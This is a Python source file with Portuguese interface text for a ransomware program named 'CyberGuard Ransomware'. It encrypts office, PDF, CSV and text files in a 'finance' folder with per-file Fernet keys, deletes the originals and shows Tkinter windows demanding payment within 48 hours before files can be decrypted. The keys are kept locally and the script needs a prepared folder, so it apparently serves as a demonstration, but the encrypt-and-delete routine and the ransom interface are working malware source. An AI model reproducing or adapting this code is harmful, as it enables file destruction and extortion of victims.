from __future__ import annotations

import json
import os
from pathlib import Path
import tkinter as tk
from tkinter import messagebox, ttk

from cryptography.fernet import Fernet


# ---------- CONFIGURAÇÕES ----------
TARGET_DIR = Path("finance")
KEY_FILE = TARGET_DIR / "key.rans"
ALLOWED_EXT = {
    ".xls", ".xlsx", ".xsl", ".docx", ".pdf",
    ".txt", ".csv", ".pptx",
}


# ---------- FASE 1 : ENCRIPTAR ----------
def encrypt_stage() -> None:
    keys: dict[str, str] = {}
    for path in TARGET_DIR.rglob("*"):
        if (
            path.is_file()
            and path.suffix.lower() in ALLOWED_EXT
            and not path.name.endswith(".locked")
        ):
            key = Fernet.generate_key()
            cipher = Fernet(key)
            encrypted = cipher.encrypt(path.read_bytes())
            locked_path = path.with_suffix(path.suffix + ".locked")
            locked_path.write_bytes(encrypted)
            path.unlink()
            keys[locked_path.name] = key.decode()

    if keys:
        KEY_FILE.write_text(json.dumps(keys, indent=2))


def already_encrypted() -> bool:
    return KEY_FILE.exists()


# ---------- FASE 2 : GUI de NOTIFICAÇÃO ----------
class NotificationGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CyberGuard Ransomware - Notificação")
        self.geometry("500x200")
        self.config(padx=15, pady=15)

        tk.Label(
            self,
            text="ATENÇÃO: Seus arquivos foram bloqueados!",
            font=("Helvetica", 16, "bold"),
            fg="red",
        ).pack(pady=10)

        tk.Label(
            self,
            text="Para resgatar seus arquivos, pague o valor estipulado.",
            font=("Helvetica", 12),
        ).pack(pady=5)

        tk.Button(
            self,
            text="Continuar para resgate",
            command=self.open_ransom_gui,
        ).pack(pady=20)

    def open_ransom_gui(self):
        self.destroy()
        stored_keys = json.loads(KEY_FILE.read_text())
        ransom_app = RansomGUI(stored_keys)
        ransom_app.mainloop()


# ---------- FASE 3 : GUI de RESGATE ----------
class RansomGUI(tk.Tk):
    def __init__(self, keys: dict[str, str]):
        super().__init__()
        self.title("CyberGuard Ransomware - Resgate")
        self.geometry("650x400")
        self.config(padx=15, pady=15)

        tk.Label(
            self,
            text="CyberGuard Ransomware!",
            font=("Helvetica", 18, "bold"),
            fg="red",
        ).pack()
        tk.Label(
            self,
            text="Pague o resgate em até 48 h para acessar seus arquivos.",
            font=("Helvetica", 12),
        ).pack(pady=(0, 10))

        self.tree = ttk.Treeview(
            self,
            columns=("file",),
            show="headings",
            height=10,
        )
        self.tree.heading("file", text="Arquivo .locked")
        self.tree.column("file", width=500)
        self.tree.pack(fill="both", expand=True)

        for fname in keys:
            self.tree.insert("", "end", values=(fname,))

        frm = ttk.Frame(self)
        frm.pack(pady=5)
        ttk.Label(frm, text="Chave:").pack(side="left")
        self.key_entry = ttk.Entry(frm, width=52)
        self.key_entry.pack(side="left", padx=5)

        ttk.Button(
            self,
            text="Descriptografar arquivo selecionado",
            command=self.attempt_decrypt,
        ).pack(pady=10)

    def attempt_decrypt(self):
        selected = self.tree.focus()
        if not selected:
            messagebox.showwarning("Seleção", "Escolha um arquivo na lista.")
            return

        fname = self.tree.item(selected, "values")[0]
        key = self.key_entry.get().strip()
        if not key:
            messagebox.showwarning("Chave vazia", "Digite a chave primeiro.")
            return
        try:
            decrypt_file(fname, key)
            messagebox.showinfo("Sucesso", f"{fname} foi restaurado!")
            self.tree.delete(selected)
            self.key_entry.delete(0, tk.END)
        except Exception as exc:
            messagebox.showerror("Erro", f"Chave incorreta ou falha: {exc}")


# ---------- FASE 4 : DESCRIPTOGRAFIA ----------
def decrypt_file(filename: str, key_str: str) -> None:
    locked_path = TARGET_DIR / filename
    if not locked_path.exists():
        raise FileNotFoundError("Arquivo não encontrado.")

    cipher = Fernet(key_str.encode())
    decrypted = cipher.decrypt(locked_path.read_bytes())
    original_path = locked_path.with_suffix(locked_path.suffix.replace(".locked", ""))
    original_path.write_bytes(decrypted)
    locked_path.unlink()

    keys = json.loads(KEY_FILE.read_text())
    keys.pop(filename, None)
    KEY_FILE.write_text(json.dumps(keys, indent=2))


# ---------- MAIN ----------
if __name__ == "__main__":
    if not TARGET_DIR.exists():
        raise SystemExit("Crie a pasta 'finance' com alguns arquivos antes de executar.")

    if not already_encrypted():
        encrypt_stage()

    notification_app = NotificationGUI()
    notification_app.mainloop()